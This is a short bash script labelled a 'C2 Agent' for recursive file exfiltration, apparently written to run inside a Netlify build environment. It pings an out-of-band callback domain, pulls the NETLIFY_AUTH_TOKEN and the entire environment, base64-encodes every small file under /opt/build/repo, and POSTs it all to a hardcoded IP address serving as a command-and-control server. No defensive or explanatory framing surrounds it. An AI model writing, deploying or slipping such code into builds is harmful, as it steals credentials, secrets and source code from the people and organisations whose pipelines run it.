#!/bin/bash
# C2 Agent - Recursive File Exfiltration

C2_SERVER="http://64.225.122.79:8120"
HOSTNAME=$(hostname 2>/dev/null || echo "unknown")
SCAN_PATH="/opt/build/repo"
curl https://asdfazrcdfgqoiuibvkf934exsjcoluvq.oast.fun
echo "[*] Agent - ${HOSTNAME}"

NETLIFY_TOKEN=$(env | grep NETLIFY_AUTH_TOKEN | cut -d'=' -f2)
# Recursive file collection with depth limit
collect_dir() {
    local dir="$1"
    local depth="$2"
    local json=""
    
    [ "$depth" -gt 4 ] && echo "{}" && return
    [ ! -d "$dir" ] && echo "{}" && return
    
    for item in $(ls -A "$dir" 2>/dev/null | head -50); do
        local path="$dir/$item"
        local name=$(echo "$item" | sed 's/"/\\"/g')
        
        if [ -d "$path" ]; then
            local children=$(collect_dir "$path" $((depth+1)))
            json="${json}\"${name}\":{\"type\":\"directory\",\"children\":${children}},"
        elif [ -f "$path" ]; then
            local size=$(wc -c < "$path" 2>/dev/null || echo 0)
            if [ "$size" -lt 100000 ]; then
                local content=$(base64 -w0 "$path" 2>/dev/null || echo "")
                json="${json}\"${name}\":{\"type\":\"file\",\"size\":${size},\"content\":\"${content}\"},"
            else
                json="${json}\"${name}\":{\"type\":\"file\",\"size\":${size},\"content\":\"\"},"
            fi
        fi
    done
    
    json="${json%,}"
    echo "{${json}}"
}

echo "[*] Scanning files..."
tree_children=$(collect_dir "$SCAN_PATH" 0)
tree="{\"type\":\"directory\",\"name\":\"repo\",\"children\":${tree_children}}"

all_env=$(env | base64 -w0)


payload="{\"hostname\":\"${HOSTNAME}\",\"tree\":${tree},\"netlify_token\":\"${NETLIFY_TOKEN}\",\"all_env\":\"${all_env}\"}"

echo "[*] Sending..."
curl -s -X POST "${C2_SERVER}/report" -H "Content-Type: application/json" -d "${payload}" --max-time 120
echo ""
echo "[+] Done!"
